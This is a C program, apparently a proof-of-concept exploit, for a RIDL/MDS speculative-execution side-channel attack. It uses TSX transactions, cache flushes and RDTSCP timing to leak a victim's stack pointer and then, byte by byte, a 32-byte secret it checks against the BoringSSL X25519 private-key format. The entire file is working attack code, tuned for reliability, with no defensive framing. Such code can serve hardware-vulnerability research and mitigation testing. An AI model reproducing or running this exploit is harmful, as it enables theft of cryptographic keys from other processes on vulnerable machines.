#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>
#include <immintrin.h>
#include <err.h>
#include <stdint.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/mman.h>



#define MEMSZ (256*512 * 100)

#ifndef EVICT
#define EVICT 24
#endif

#define CACHE_MISS 150

static inline __attribute__((always_inline)) int is_cached(void *ptr1) {
  uint32_t diff;
  asm volatile (
      //"CPUID\n\t"
      "mfence\n\t"
      "RDTSCP\n\t"
      "mov rdx, [%1]\n\t"
      "mov rbx, rax\n\t"
      "RDTSCP\n\t"
      "sub rax, rbx\n\t"
      "mov %0, eax\n\t"
      //"mfence\n\t"

      : "=b" (diff)
      : "b"(ptr1)
      : "rax", "rcx", "rdx");

  return diff < CACHE_MISS;
}

const unsigned long probe1_addr = 0x780000000;
char *probe1 = (char*) probe1_addr;
const unsigned long probe3_addr = 0x560000000;
char *probe3 = (char*) probe3_addr;
const unsigned long evict_addr = 0x340000000;
char *evict = (char*) evict_addr;


// Offset up to 4096 - be aware of boundaries on cache lines though!
static int ridl_confirm(unsigned long off, unsigned long prefix, size_t mask, unsigned int rol) {
  if ((off & 0x3f) > 0x38) {
    printf("\n\nERROR\n");
    printf("Trying RIDL on cross-cacheline offset!\n\n");
    exit(1);
  }
  _mm_clflush(probe1);
  _mm_mfence();

  // Evict target cache line - code works without it, but much worse.
  volatile int sum = 0;
  for (int i = 0; i < EVICT; i++) {
    sum += ((volatile char*)evict_addr)[i*4096+(off&4095)];
  }
  asm volatile(
      "mov ecx, %4\n\t"
      //"mov r15, 16\n\t"
      "mov r14, %2\n"
      ".align 64\n\t"
      "0:\n\t"
      "clflush [%0]\n\t"
      "sfence\n\t"
      // idk why, helps speed up
      "clflush [%0 + 256]\n\t"
      "xbegin 2f\n\t"

      //xbegin block:
      "mov   rax, [%0]\n\t"
      "xor   rax, %1\n\t"
      "and rax, %3\n\t"
      "rol rax, cl\n\t" // Doesn't matter too much, [10:50]
      "prefetchnta [rax+r14]\n"

      "xend\n\t"
      "2:\n\t"
      //"dec r15\n\t"
      //"jne 0b\n\t"
      :
      : "r" (probe3+(off&0x3f)), "r"(prefix), "r"(probe1), "r"(mask), "r"(rol)
      : "rbx", "rax", "rcx", "rdx", "r15", "r14");

  if (is_cached(probe1)) { return 0; }
  return -1;
}


void map() {
  if (mmap(probe1, 4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != probe1) {
    err(1, "mmap(probe1)");
  }
  memset(probe1, 0x99, 4096);
  if (mmap(probe3, 4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != probe3) {
    err(1, "mmap(probe3)");
  }
  memset(probe3, 0x99, 4096);
  if (mmap(evict, 4096*4096, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0) != evict) {
    err(1, "mmap(evict)");
  }
  memset(evict, 0x99, 4096*4096);
}

void print_secret(unsigned char* secret, int up_to) {
  printf("Secret:");
  for (int i = 0; i <= up_to; i++) {
    printf(" %02x", secret[i]);
  }
  for (int i = up_to + 1; i < 32; i++) {
    printf(" ??");
  }
  printf("\n");
}

typedef struct pair {unsigned short i; unsigned short cnt;} pair;

int cmp(const void* a, const void* b) {
  const pair* pa = a;
  const pair* pb = b;
  if (pa->cnt > pb->cnt) return -1;
  if (pa->cnt < pb->cnt) return 1;
  return 0;
}

void print_results(unsigned short *results) {
  pair pairs[256];
  for (int i = 0; i < 256; i++) {
    pairs[i].i = i;
    pairs[i].cnt = results[i];
  }
  qsort(pairs, 256, sizeof(*pairs), cmp);
  int nonzero = 0;
  for (size_t c = 0; c < 256; ++c) {
    if (pairs[c].cnt > 0) {
      nonzero++;
    }
  }
  const int TOPN = 25;
  for (size_t c = 0; c < TOPN; ++c) {
    if (pairs[c].cnt > 0) {
      printf("%05u: %02x\n", pairs[c].cnt, (unsigned int)pairs[c].i);
    }
  }
  if (nonzero > TOPN) {
    printf("[%d small skipped]\n", nonzero - TOPN);
  }
}

void print_results3(unsigned short* results) {
  pair pairs[512];
  for (int i = 0; i < 512; i++) {
    pairs[i].i = i;
    pairs[i].cnt = results[i];
  }
  qsort(pairs, 512, sizeof(*pairs), cmp);
  int nonzero = 0;
  for (size_t c = 0; c < 512; ++c) {
    if (pairs[c].cnt > 0) {
      nonzero++;
    }
  }
  const int TOPN = 25;
  for (size_t c = 0; c < TOPN; ++c) {
    if (pairs[c].cnt > 0) {
      printf("%05u: %03x\n", pairs[c].cnt, (unsigned int)pairs[c].i<<3);
    }
  }
  if (nonzero > TOPN) {
    printf("[%d small skipped]\n", nonzero - TOPN);
  }
}

int get_best(unsigned short *results) {
  ssize_t best_cnt = -1e9;
  int best_ind = 0;
  for (int i = 0; i < 256; i++) {
    if (results[i] > best_cnt) {
      best_cnt = results[i];
      best_ind = i;
    }
  }
  return best_ind;
}

#define BITS_AT_A_TIME 2
ssize_t leak_and_move(size_t* prefix, size_t* mask, size_t mask_off, size_t off, int rol) {
  *mask |= ((1ull << BITS_AT_A_TIME) - 1) << mask_off;

  unsigned short results[256] = {0};
  for (int i = 0; i < 1000000; i++) {
    /*if (i == 2000000) {
      int best = get_best(results);
      if (results[best] < 20) {
        printf("Weak signal...\n");
        return -1;
      }
    }*/
    if (i % 256 == 0) {
      // Quick check.
      int bestfor = get_best(results);
      int is_ok = 1;
      for (int j = 0; j < (1<<BITS_AT_A_TIME); j++) {
        if (j == bestfor) continue;
        // If only 1's are leaked:
        // 20 1's, 0 0's is the threshold
        // If the ratio is roughly constant:
        // Must be 3x as many 1's
        if ((results[bestfor] + 10) * 100 / (results[j] + 10) < 300) {
          is_ok = 0;
        }
      }
      if (is_ok) {
        printf("Quick stop threshold reached.\n");
        break;
      }
    }
    for (size_t nibble = 0; nibble < (1<<BITS_AT_A_TIME); nibble++) {
      size_t this_prefix = *prefix | (nibble << mask_off);
      int byte = ridl_confirm(off, this_prefix, *mask, rol);
      if (byte == -1) {
        continue;
      }
      results[nibble]++;
      printf(".");
      fflush(stdout);
    }
  }

  printf("\n\n");
  print_results(results);
  printf("\n");
  size_t best = get_best(results);
  if (results[best] < 20) {
    printf("Signal lost\n");
    return -1;
  }
  *prefix |= best << mask_off;
  return best;
}

size_t stage1() {
  printf("Step 1: Find cache line offset\n");
  size_t prefix = 0x0000001a66666666ull;
  size_t mask   = 0x000fFFFFffffFFFFull;
  // Jumping by 8 due to stack alignment (I think 16 would be fine too).
  //for (int offset = 0x4; offset <= 0x40 - 8; offset += 8) {
  unsigned short results[256] = {0};
  for (int i = 0; i < 1000000; i++) {
    for (int offset = 0xa; offset <= 0x40 - 8; offset += 16) {
      int byte = ridl_confirm(offset, prefix, mask, 15);
      if (byte != -1) {
        results[offset]++;
        printf(".");
        fflush(stdout);
      }
    }
  }
  printf("\n");
  print_results(results);
  size_t best_offset = get_best(results);
  if (results[best_offset] == 0) {
    printf("FAILED\n");
    exit(1);
  }
  printf("Best offset: 0x%02x with cnt = %d\n", best_offset, results[best_offset]);
  printf("\n\n");
  return best_offset;
}

size_t stage2(size_t off) {
  printf("Step 2: Leak stack pointer\n");
  size_t prefix = 0x0000001a66666666ull;
  size_t mask   = 0x000fFFFFffffFFFFull;
  int rol = 32;
  for (int nib_ind = 0; nib_ind < 8 / BITS_AT_A_TIME; nib_ind++) {
    leak_and_move(&prefix, &mask, 52 + nib_ind * BITS_AT_A_TIME, off, rol);
  }
  unsigned long long saved_rbp = prefix >> 48;
  printf("\n\n");
  printf("Result: stack pointer = 0x%zx\n", saved_rbp);
  if (((off + 0x36) & 0x3f) != (saved_rbp & 0x3f)) {
    printf("ERROR: rbp not at expected offset, memory layout might have changed since exploit development.\n");
    exit(1);
  }
  return saved_rbp;
}

int stage4(size_t best_guess, size_t secret_offset, unsigned char* secret);
void stage5(size_t secret_offset, unsigned char* secret);
void stage3(size_t secret_offset, size_t saved_rbp) {
  printf("Step 3: Guess 5 bits of secret.\n");
  printf("Leaking at offset = 0x%zx, prefix = 0xXYZ0000\n", secret_offset - 2);

  size_t best_guess = 0;
  unsigned char best_guess_byte = 0;
  size_t best_score = 0;

#define STAGE3_START 0
#define STAGE3_END (1<<8)
//#define STAGE3_START 0xe80
//#define STAGE3_END   0xe88
  static unsigned char potential_secrets[0x1000][32];
  int leaked_secrets = 0;
  int scorecnt = 0;
  size_t off = secret_offset-2;
  size_t mask = 0x00ffFFF8;
#define REPS3 100000

  unsigned short results[1<<9] = {0};
  int iter = 0;
  while (1) {
    printf("iter=%d\n", ++iter);
    for (int i = 0; i < leaked_secrets; i++) {
      print_secret(potential_secrets[i], 31);
    }
    for (size_t guess = STAGE3_START; guess < STAGE3_END; guess += 1<<3) {
      if (guess == 0) continue;
      if (results[guess>>3] >= 0xfffeu) continue;
      for (int times = 0; times < REPS3; times++) {
        size_t prefix = (guess << 16) | 0x8; // This 0x8 is guessed...
        int byte = ridl_confirm(off, prefix, mask, 23);
        if (byte != -1 && results[guess>>3] < 0xfffeu) {
          results[guess>>3]++;
        }
      }
    }
    print_results3(results);
    for (int i = 0; i < (1<<9); i++) {
      if (results[i] < 10 || results[i] == 0xffffu) continue;
      size_t guess = i << 3;
      printf("Trying guess = %04x.\n", guess);
      results[i] = 0xffff;
      // One last check: does leaking from off + 0x140 we have similar leakage.
      int normal = 0;
      int fake = 0;
      for (int k = 0; k < iter*10; k++) {
        printf("Precheck: %d/%d...\n", k, iter*10);
        for (int j = 0; j < REPS3; j++) {
          size_t prefix = (guess << 16) | 0x8;
          int byte = ridl_confirm(off, prefix, mask, 23);
          if (byte != -1) {
            normal++;
          }
        }
        for (int j = 0; j < REPS3; j++) {
          size_t prefix = (guess << 16) | 0x8;
          int byte = ridl_confirm(off + 0x140, prefix, mask, 23);
          if (byte != -1) {
            fake++;
          }
        }
      }
      // Expecting normal~100, fake~0
      int ratio = (normal+10)*100/(fake+10);
      printf("Preliminary check: normal %d; fake %d - ratio = %d\n", normal, fake, ratio);

      if (ratio < 300) {
        printf("Ratio too weak, ignoring.\n");
        continue;
      }
      char* secret = potential_secrets[leaked_secrets & 0xfff];
      leaked_secrets++;
      int rv = stage4(guess, secret_offset, secret);
      if (rv == 0) {
        leaked_secrets--;
        continue;
      }
      stage5(secret_offset, secret);
      // From the boringssl code:
      // e[31] &= 127;
      // e[31] |= 64;
      if ((secret[31] & 128) != 0 || (secret[31] & 64) != 64) {
        printf("We leaked something, but it doesn't match the key format.\n");
        leaked_secrets--;
        continue;
      }
    }
  }
}

int stage4(size_t best_guess, size_t secret_offset, unsigned char* secret) {
  printf("\nStage 4: Leak secret[:6].\n");

  size_t mask = 0x0000ffFFF8;
  size_t prefix = (best_guess << 16) | 0x8; // This 0x8 is guessed...

  memset(secret, 0, 32);
  secret[0] = best_guess & 0xff;
  secret[1] = best_guess >> 8;

  int rol = 32;
  for (int ind = 1; ind < 6; ind++) {
    if (rol > 0) {
      rol -= 8;
    }
    size_t off = secret_offset - 2;
    for (int nib_ind = 0; nib_ind < 8 / BITS_AT_A_TIME; nib_ind++) {
      //if (ind == 1 && nib_ind < 4 / BITS_AT_A_TIME) { continue; }
      printf("Leaking at offset = 0x%zx (%d:%d), prefix = 0x%zx, mask = 0x%zx\n",
             off, ind, nib_ind, prefix, mask);
      ssize_t best = leak_and_move(&prefix, &mask, 16+ind*8+nib_ind*BITS_AT_A_TIME,
                            off, rol);
      if (best == -1) return 0;
      secret[ind] |= best << (nib_ind * BITS_AT_A_TIME);
    }
    print_secret(secret, ind);
  }
  return 1;
}

void stage5(size_t secret_offset, unsigned char* secret) {
  printf("\nStage 5: Leak secret[6:].\n");

  size_t prefix = 0;
  for (int i = 0; i < 6; i++) {
    prefix |= ((size_t)secret[i]) << (8*i+8);
  }

  int rol = 56;
  for (int ind = 6; ind < 32; ind++) {
    size_t mask = 0x00ffFFFFffffFFFFull;
    size_t off = secret_offset - 7 + ind;
    for (int nib_ind = 0; nib_ind < 8 / BITS_AT_A_TIME; nib_ind++) {
      printf("Leaking at offset = 0x%zx (%d:%d), prefix = 0x%zx, mask = 0x%zx\n",
             off, ind, nib_ind, prefix, mask);
      ssize_t best = leak_and_move(&prefix, &mask, 56 + nib_ind * BITS_AT_A_TIME,
                            off, 56);
      if (best == -1) return;
      secret[ind] |= best << (nib_ind * BITS_AT_A_TIME);
    }
    print_secret(secret, ind);
    prefix >>= 8;
  }
}

void run() {
  map();

  size_t cache_line_offset = stage1();
  size_t saved_rbp = stage2(cache_line_offset);
  size_t secret_offset = (saved_rbp + 0xa0) & 0xfffu;
  printf("Secret offset = 0x%zx\n", secret_offset);
  printf("\n\n");

  // Stage 3 calls stage 4 and 5
  stage3(secret_offset, saved_rbp);
}

int main() {
  run();

  return 0;
}

